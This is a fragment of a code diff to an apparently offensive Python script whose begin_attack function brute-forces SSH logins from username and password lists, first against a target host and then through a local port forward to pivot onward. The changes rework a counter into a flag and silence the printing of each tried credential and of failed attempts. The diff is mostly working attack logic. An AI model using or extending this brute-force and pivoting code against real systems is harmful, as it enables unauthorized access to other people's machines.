@@ -130,14 +130,14 @@ def begin_attack(client):
             print "USER: %s" % userCred
             while (passwd < passwd_len) and (not logged_in):
                 passCred = PASSWORDS[passwd]
-                print "%s : %s" % (userCred, passCred)
                 try:
-                    if initial_comps > 0:
-
+                    # if initial_comps > 0:
+                    if not initial_comps:
                         # attempt to login with current creds
                         client.connect(server.host, server.ssh_port, username=userCred, password=passCred)
                         verbose("Connected to %s:%s" % (server.host, server.ssh_port))
-                        initial_comps -= 1
+                        # initial_comps -= 1
+                        initial_comps = True
                     else:
                         client.connect("localhost", server.local_forward, username=userCred, password=passCred)
                         # verbose("Connecting to localhost:%d -> %s:%s" % (server.local_forward, server.host, server.ssh_port))
@@ -150,7 +150,7 @@ def begin_attack(client):
                         log_root = True
 
                 except Exception as e:
-                    print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
+                    # print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
                     passwd += 1
 
             userN += 1
@@ -287,8 +287,9 @@ if __name__ == "__main__":
     # print PASSWORDS
 
     # initialize the queue with starting computer list
+    initial_comps = False
     for c in computers:
-        initial_comps += 1
+        # initial_comps += 1
         host, port = get_host_port(c)
         compObj = Computer(host, port)
         ip_list.append(host)
